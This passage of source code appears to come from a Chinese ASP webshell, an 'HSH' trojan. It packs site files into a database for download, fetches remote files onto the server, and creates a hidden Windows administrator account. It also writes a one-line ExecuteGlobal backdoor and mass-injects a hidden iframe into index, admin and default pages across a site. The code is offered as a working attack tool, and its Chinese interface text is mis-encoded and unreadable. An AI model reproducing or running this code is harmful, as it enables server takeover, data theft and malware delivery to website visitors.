		Set Matches = Nothing
		Set regEx = Nothing
	end if
	set ofile = nothing
	set FSO1s = nothing
End Sub
Sub PageAddToMdb()
Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
RRS "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
RRS "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
RRS"<br>�ļ��д��:"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS"<input type=hidden value=addToMdb name=theAct>"
RRS"<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
RRS"</select>"
RRS" <input type=submit value='��ʼ���'>"
RRS"<br><br>ע: �������HSH.mdb�ļ�,λ��HSHľ��ͬ��Ŀ¼��"
RRS"</form>"
RRS"<hr/>�ļ����⿪(��FSO֧��):<br/>"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80>"
RRS" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='�⿪��'>"
RRS"<br><br>ע: �⿪���������ļ���λ��HSHľ��ͬ��Ŀ¼��"
RRS"</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(thePath) = False Then
showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
End If
Set theFolder = Server.CreateObject("Scripting.FileSystemObject").GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub

Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(Left(thePath, i)) = False Then
Server.CreateObject("Scripting.FileSystemObject").CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function


Function upload()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
		RRS "���ص�������:�޻���...Ϊ�˽�ʡ.�����޻���<hr/>"
		RRS "<form method=post>"
		RRS "<input name=theUrl value='http://' size=80><input type=submit value=' ���� '><br/>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=checkbox name=overWrite value=2>���ڸ���"
		RRS "<input type=hidden value=downFromUrl name=theAct>"
		RRS "</form>"
		RRS "<hr/>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		If overWrite <> 2 Then
			overWrite = 1
		End If
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then
		End If
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		Set Http = Nothing
		Set Stream = Nothing
		If isDebugMode = False Then
			On Error Resume Next
		End If
End Function
Function GetDateModify(filepath)
	Set F2SO = CreateObject("Scripting.FileSystemObject")
    Set f = F2SO.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set F2SO = nothing
	GetDateModify = s
End Function
Function GetDateCreate(filepath)
	Set F3SO = CreateObject("Scripting.FileSystemObject")
    Set f = F3SO.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set F3SO = nothing
	GetDateCreate = s
End Function
Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
	Set F4SO = CreateObject("Scripting.FileSystemObject")
	if not F4SO.FolderExists(path) then exit sub
	Set f = F4SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call IsFind(Path&"\"&myfile.name)
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile2 path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
	theDate = GetDateModify(thePath)
	on error resume next
	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
	if err then exit Sub
	xDate = Split(request.Form("Search_Date"),";")
	If request.Form("Search_Date") = "ALL" Then ALLTime = True
	For i = 0 To Ubound(xDate)
		If theTmp = xDate(i) or ALLTime = True Then 
			If request("Search_Content") <> "" Then
				Set FSO2s = CreateObject("Scripting.FileSystemObject")
				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
				filetxt = Lcase(ofile.readall())
				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
    temp=temp&" �� <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Sun = Sun + 1
					Exit Sub
				End If
				ofile.close()
				Set ofile = Nothing
				Set FSO2s = Nothing
			Else
				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
				Sun = Sun + 1
				Exit Sub
			End If
		End If
	Next
End Sub

case "lp"
RRS"<form action='?action=lp' method=post>"
RRS"<center><br>"
RRS"�û�:<input name='UsErname' type='text' value='hacker'><br>"
RRS"����:<input name='PaSswd' type='text' value='hacker'><br>"
RRS"<input type='submit' Value='�� ��'></form>"
on error REsume next
if REquEst.SErvErvariables("REMOTE_ADDR")<>"127.0.0.1" thEn
REsPonsE.writE "iP !s n0T RiGHt"
else
if REquEst("UsErname")<>"" thEn
UsErname=REquEst("UsErname")
PaSswd=REquEst("PaSswd")
REsPonsE.ExpiREs=0
Session.TimeOut=50
SErvEr.ScRipTTimeout=3000
set lp=SErvEr.CreateObject("WScRipT.NETWORK")
oz="WinNT://"&lp.ComputerName
Set ob=GetObject(oz)
Set oe=GetObject(oz&"/Administrators,group")
Set od=ob.Create("UsEr",UsErname)
od.SetPaSsword PaSswd
od.SetInfo
oe.Add oz&"/"&UsErname
if err thEn
REsPonsE.writE "��~~�����㻹�Ǳ���6+1�ˡ���ʡ��2ԪǮ��ƿ����Ҳ�á���"
else
if instr(SErvEr.createobject("WScRipT.shell").exec("cmd.exe /c net UsEr "&UsErname.stdout.readall),"�ϴε�¼")>0 thEn
REsPonsE.writE "��Ȼû�д���,���Ǻ���Ҳû�����ɹ�.��һ�������ư�"
else
REsPonsE.writE "OMG!"&UsErname&"�ʺž�Ȼ����!�����δ֪©����.5,000,000RMB�������"
end if
end if
else
REsPonsE.writE "�����������û���"
end if
end If
Err.Clear
Case "backup"
RRS"<center><b><p><font size=5>���ݿ��ֶθ��ƹ���</font></p></b></center>"
RRS"<center><font>��һ����</font>"
RRS"<form action='' method=post name=form >"
RRS"<center>��ѡ�������Ƶ����ݿ����ͣ�</center>"
RRS"<center><input type='radio' name='mdbsql' value='sql' checked>sql���ݿ�"
RRS"<center><input type='radio' name='mdbsql' value='mdb'>mdb���ݿ�<br>"
RRS"�����Ƶ��ֶ�����<input type=text name=zhi>&nbsp;&nbsp;"
RRS"<center><input type=submit name='button' value='��  ��'></form>"
zhi=REquEst.form("zhi")
if zhi>0 thEn
mdbsql=REquEst.form("mdbsql")
REsPonsE.writE "<font color=red><center>�ڶ�����</center></font>"
REsPonsE.writE "<form action='' method=post name=form1>"
REsPonsE.writE "<center>������mdb���ݿ����ƣ�<input type=text name=mdbname>(���mdb��չ��)</center><br>"
if mdbsql="sql" thEn
REsPonsE.writE "<center>sql���ݿ��û����ƣ�</center><input type=text name=sqlUsErname><br>"
REsPonsE.writE "<center>sql���ݿ��������룺</center><input type=text name=sqlpwd><br>"
REsPonsE.writE "<center>sql���ݿ����ƣ�</center><input type=text name=sqldataname><br>"
REsPonsE.writE "<center>sql���ݿ��б�����ƣ�</center><input type=text name=sqltable><br>"
REsPonsE.writE "<center>sql���ݿ��ַ��</center><input type=text name=sqldatasource value='(local)'>(Ĭ��)<br>"
elseif mdbsql="mdb" thEn
REsPonsE.writE "<center>access���ݿ����ƣ�</center><input type=text name=sqldataname>(����ļ���չ��)<br>"
REsPonsE.writE "<center>access���ݿ��б�����ƣ�</center><input type=text name=sqltable><br>"
end if
REsPonsE.writE "<center>������䣺<input type=text name=tiaojian>where���������,��WHEREҲҪд���,���ظñ����������򱣳ֿհ�</center><br>"
REsPonsE.writE "<input type=hidden name=mdbsql value=" & mdbsql &">"
REsPonsE.writE "<input type=hidden name='zhi' value=" & zhi &">"
for i=1 to zhi
REsPonsE.writE "<center>�����Ƶ��ֶ����ƣ�</center><input type=text name=sqlrow("& i &")>"
REsPonsE.writE "<center>�ֶ����ͣ�</center><select name=sqltype("& i & ")>"
REsPonsE.writE "<option select value=varchar><center>�ı�</center></option><option select value=memo><center>��ע</center></option><option select value=integer><center>����</center></option><option select value=datetime><center>����/ʱ��</center></option><option select value=image><center>ole����</center></option><option select value=bit><center>����</center></option>"
REsPonsE.writE "</select><br>"
next
REsPonsE.writE "<br><center><input type=submit name='button' value='��  ��'></center>"
REsPonsE.writE "</form>"
end if
tiaojian=REquEst.form("tiaojian")
mdbname=REquEst.form("mdbname") 
if len(mdbname)>0 thEn 
REsPonsE.writE "<font color=red><center>��������</center></font><br>" 
zhi=REquEst.form("zhi") 
sqltable=REquEst.form("sqltable") 
sqlUsErname=REquEst.form("sqlUsErname") 
sqlpwd=REquEst.form("sqlpwd") 
sqldataname=REquEst.form("sqldataname") 
sqldatasource=REquEst.form("sqldatasource") 
mdbsql=REquEst.form("mdbsql") 
mdbcreate="" 
mdbinsert="" 
sqlselect="" 
dim srow(),stype() 
redim srow(zhi),stype(zhi) 
on error REsume next 
for i=1 to cint(zhi) 
srow(i) =REquEst.form("sqlrow(" & i &")") 
stype(i)=REquEst.form("sqltype(" & i &")") 
mdbcreate=mdbcreate & "[" & srow(i) & "] " & stype(i) &"," 
mdbinsert=mdbinsert  & srow(i) & "|" 
sqlselect=sqlselect & srow(i) & "," 
next 
mdbcreate=left(mdbcreate,len(mdbcreate)-1) 
mdbinsert=left(mdbinsert,len(mdbinsert)-1) 
sqlselect=left(sqlselect,len(sqlselect)-1) 
call crtable(mdbname,sqltable,mdbcreate) 
call copysq(mdbname,sqltable,sqlpwd,sqlUsErname,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
end if
function crtable(mdbname,sqltable,mdbcreate)
dbFilE=SErvEr.mapPaTh(mdbname)
set ydb=SErvEr.createobject("adox.catalog")
ydb.create "provider=microsoft.jet.oledb.4.0;data source=" & dbFilE
set ydb=nothing
set conn = SErvEr.createobject("adodb.connection")
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbFilE
sql="create table [" & sqltable &"](" & mdbcreate &")"
conn.execute(sql)
conn.close
set conn=nothing
end function
function copysq(mdbname,sqltable,sqlpwd,sqlUsErname,sqldataname,sqldatasource,mdbinsert,sqlselect,mdbsql) 
mdbarray=split(mdbinsert,"|") 
max=ubound(mdbarray) 
dbFilE=SErvEr.mapPaTh(mdbname)  
set conn = SErvEr.createobject("adodb.connection")  
conn.open "provider=microsoft.jet.oledb.4.0; data source=" & dbFilE  
set rs = createobject("adodb.recordset")
rs.open "["& sqltable &"]", conn, 1, 3  
if mdbsql="sql" thEn 
set connstr=SErvEr.createobject("adodb.connection")
connstr.open  "provider=sqloledb.1;PaSsword="&sqlpwd&";UsEr id="&sqlUsErname&";database="&sqldataname&";data source ="&sqldatasource 
elseif mdbsql="mdb" thEn 
FilEPaTh1=SErvEr.mapPaTh(sqldataname) 
set connstr=SErvEr.createobject("adodb.connection")
connstr.open  "provider=microsoft.jet.oledb.4.0;data source=" & FilEPaTh1 
end if 
sql1="select "& sqlselect &" from ["& sqltable &"] "& tiaojian &" " 
set showbbs=connstr.execute(sql1) 
do while not showbbs.eof 
rs.addnew 
for i=0 to max 
rs(mdbarray(i))=showbbs(mdbarray(i)) 
next 
rs.update  
showbbs.movenext 
loop 
showbbs.close 
set showbbs=nothing 
if err.number=0 thEn  
REsPonsE.writE dbFilE & " <center>���ݸ��Ƴɹ�</center>����"  
REsPonsE.writE "<a href="& mdbname &"><center>����</center></a>"
else  
REsPonsE.writE "<center>ʧ�ܣ�ԭ�� " & err.deScRipTion  
REsPonsE.end 
end if 
end Function
Case "nofw"
PaTh=trim(REquEst.form("PaTh"))
text=trim(REquEst.form("text"))
if text<>"" and PaTh<>"" thEn
text=REplAcE(text,"^","^^")
text=REplAcE(text,">","^>")
text=REplAcE(text,"<","^<")
text=REplAcE(text,"&","^&")
text=REplAcE(text,":","^:")
text=REplAcE(text,"+","^+")
text=REplAcE(text,"|","^|")
text=REplAcE(text,chr(34),"^"&chr(34))
Dim myArray
Dim b()
k=0
myarray= Split(text,Chr(13))
For i=0 to UBound(myarray)
for j=1 to len(myarray(i))
if mid(myarray(i),j,1)<>" " and mid(myarray(i),j,1)<>chr(10) and mid(myarray(i),j,1)<>chr(13) thEn
tn=0
exit for
end if
next
If tn=0 and myarray(i)<> "" and myarray(i)<>chr(13) and myarray(i)<>chr(10) thEn
k=k+1
ReDim pREserve b(k)
b(k)=myarray(i)
b(k)=REplAcE(b(k),chr(10),"")
End If
tn=1
Next
set shell=SErvEr.createobject("shell.application")
For L=1 TO k
REsPonsE.writE SErvEr.htmlencode(b(L))&"</br>"
set shellfolder=shell.namespace("C:\Documents and Settings\Default UsEr\����ʼ���˵�\����\����")
set shellfolderitEm=shellfolder.parsename("���±�.lnk")
set objshelllink =shellfolderitEm.getlink
objshelllink.PaTh="cmd.exe"
objshelllink.arguments="/c echo "&b(L)&" >>"&PaTh&" &&DEl c:\a.lnk"
objshelllink.save("c:\a.lnk")
shell.namespace("c:\").itEms.itEm("a.lnk").invokeverb
timeit(0.1)
next
Function TimeIt(N)
StartTime = Timer
do while endtime-starttime<n
EndTime = Timer
loop
End Function
REsPonsE.writE k
end if
RRS"<form method='post' action=?action=nofw>"
RRS"��FSO-WSHд����ļ�:<input type=text name=PaTh size=40 value='"&Server.MapPath("/")&"\help.asp'><p>"
RRS"<textarea name=text rows=30 cols=100 >��ɨ��ɱһ�仰"&chr(60)&"%ExecuteGlobal request("&chr(34)&"1"&chr(34)&")%"&chr(62)&"</textarea><p>"
RRS"<input type=submit value=ִ��></form>"
Case "plgm":Server.ScriptTimeout=1000000:Response.Buffer=False
RRS ("<b>��ǰ��վ����·��:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode = Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
RRS("<form method=""POST""> ")
RRS("<table width=560 border=""0"" style=""font-size:12px;"">")
RRS("<tr>")
RRS("<td width=""102"">Ҫ������ļ��� (����·��)��</td>")
RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
RRS("<td width=""69"">&nbsp;</td>")
RRS("</tr><tr><td>Ҫ����Ĵ���:</td>")
RRS("<td><textarea name=""code"" cols=58 rows=""3"">"&addcode&"</textarea></td>")
RRS("<td><input name=""submit"" type=""submit"" value=""��ʼ""></td>")
RRS("</tr></table></form>")
End If 
Function IsPattern(patt,str) 
Set regEx=New RegExp 
regEx.Pattern=patt 
regEx.IgnoreCase=True 
retVal=regEx.Test(str) 
Set regEx=Nothing 
If retVal=True Then 
IsPattern=True 
Else 
IsPattern=False 
End If
End Function 
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>����������·�������!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
End If
end if 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If
End Sub
Sub step_all(agr) :retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|main|article|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub:End If:End Sub:Sub step1(str1)
RRS "<div style='line-height:20px'>�� "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a></div>"
End Sub:Sub step2(str2)
Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing
End Sub:Err.Clear:Case "Cplgm"
	Fpath=Request("fd")
	addcode = Request("code")
	addcode2 = Request("code2")
	pcfile=request("pcfile")
	checkbox=request("checkbox")
	checkbox1=request("checkbox1")
	ShowMsg=request("ShowMsg")
	FType=request("FType")
	zfile=request("zfile")
	M=request("M")
   
for i= 0 to ubound(split(server.mappath("."),"\"))
d=split(server.mappath("."),"\")
dir=dir&d(i)&"\"
filename=dir&"dir.txt"
On Error Resume Next
SET FSO=Server.CreateObject("Scripting.FileSystemObject")
SET FR = FSO.CreateTextFile(filename,true)
IF NOT FSO.FileExists(filename) then
else
	FR.close
	FSO.DeleteFile filename,True 
	exit for
end if
next
	if zfile="" then zfile="default|index|conn|admin|reg|main|vip|qq|mm"
	if Ftype="" then Ftype="htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
	if Fpath="\" then Fpath=Server.MapPath("\")
	if Fpath="." or Fpath="" then Fpath=dir
	if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
	if checkbox="" then checkbox=request("checkbox")
	if checkbox1="" then checkbox1=request("checkbox1")
	if pcfile="" then
		pcfileName=Request.ServerVariables("SCRIPT_NAME")
		pcfilek=split(pcfileName,"/") 
		pcfilen=ubound(pcfilek) 
		pcfile=pcfilek(pcfilen) 
	end if
    if M="1" then BT="����������-��������"
	if M="2" then BT="����������-������˵�����"
	if M="3" then BT="�����滻��-�ļ��滻�޸Ĺ���"
	if M="4" then BT="ָ������"
RRS "<form method=POST><TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD colspan=2 class=TBHead><B><FONT color=#ff2222>"&BT&"</font></B></TD></TR><tr><td class=TBTD >��վ��Ŀ¼��\����</td><td class=TBTD>"&Server.MapPath("/")&"</td></tr><tr><td class=TBTD >������Ŀ¼��.����</td><td class=TBTD>"&Server.MapPath(".")&"</td></tr><tr><td class=TBTD width='20%'>�ļ�·����</td>"
	RRS "<td class=TBTD><input type=text name=fd value='"&Fpath&"' size=40><font  color=red >==>ע��:��·��������дĿ¼(�Զ��б�)</font> </td></tr>"
	RRS "<tr><td class=TBTD>�Ƿ���δ��룺</td><td class=TBTD><input class=c name='checkbox1'  checked='checkbox1' type=checkbox value=""checked1"" "&checkbox1&"><font  color=red >д�����ʱ�Ѵ�������Ժ�д��ÿһ���ļ���Ϊ�˷�ֹ�����滻�����룬����100%�������У�</font></td></tr>"
	if M="1" then RRS "<tr><td class=TBTD>�����ظ���</td><td class=TBTD><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> ��ֹһ��ҳ�����ж���ظ��Ĵ���</td></tr>"
	if M="4" then RRS "<tr><td class=TBTD>�����ظ���</td><td class=TBTD><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> ��ֹһ��ҳ�����ж���ظ��Ĵ���</td></tr><tr><td class=TBTD>ָ���ļ���</td><td class=TBTD><input name='zfile' type=text id='zfile' value='"&zfile&"' size=40>��д��Ҫ���ļ���[������չ��]</td></tr>"
	RRS "<tr><td  class=TBTD>�ų��ļ���</td>"
	RRS "<td class=TBTD><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40>���磺1.asp|2.asp|3.asp</td></tr>"
	RRS "<tr><td class=TBTD>�ļ����ͣ�</td>"
	RRS "<td class=TBTD><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> ����Ҫ�޸ĵ��ļ�����[��չ��]</td></tr><tr><td class=TBTD>"
	if M="1" then RRS"Ҫ�ҵ���"
	if M="2" then RRS"Ҫ�����"
	if M="3" then RRS"�������ݣ�"
	RRS"</font></td><td class=TBTD><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
	if M="3" then RRS "<tr><td class=TBTD>�� �� Ϊ��</td><td  class=TBTD><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
	RRS "<tr><td class=TBTD></td><td class=TBTD> <input name=submit type=submit value=��ʼִ��> --��ǽ���--[�ɹ����� �� �ų����� �� �ظ���<font color=red>��</font>]</td></tr>"
	RRS "</table></form>" 
if request("submit")="��ʼִ��" then 
RRS "<TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD  class=TBHead align=center>���</TD><TD  class=TBHead>�ļ�����·��</TD><TD  class=TBHead width='30%' align=center>�༭��</TD></TR>"
call InsertAllFiles(Fpath,addcode,pcfile)
end if
Sub InsertAllFiles(Wpath,Wcode,pc)
	Server.ScriptTimeout=999999999
	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
	 Set WFSO = CreateObject("Scripting.FileSystemObject")
	 on error resume next 
	 Set f = WFSO.GetFolder(Wpath)
	 Set fc2 = f.files
	 For Each myfile in fc2
		Set FS1 = CreateObject("Scripting.FileSystemObject")
		FType1=split(myfile.name,".") 
		FType2=ubound(FType1) 
		if Ftype2>0 then
		FType3=LCase(FType1(FType2)) 
		else
		FType3="��"
		end if
		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
			select case M
				case "1"
					if checkbox<>"checked" then
						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
						tfile.writeline Wcode
						RRS"�� "&Wpath&myfile.name
						tfile.close
					else
						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
						if Instr(tfile1.readall,Wcode)=0 then
							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
							tfile.writeline Wcode
							RRS"��  "&Wpath&myfile.name
							tfile1.close
						else
							RRS"<font color=red>��</font> "&Wpath&myfile.name
							tfile1.close
						end if
						Set tfile1=Nothing
					end if
				case "2"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,"")
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"��  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case "3"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,addCode2)
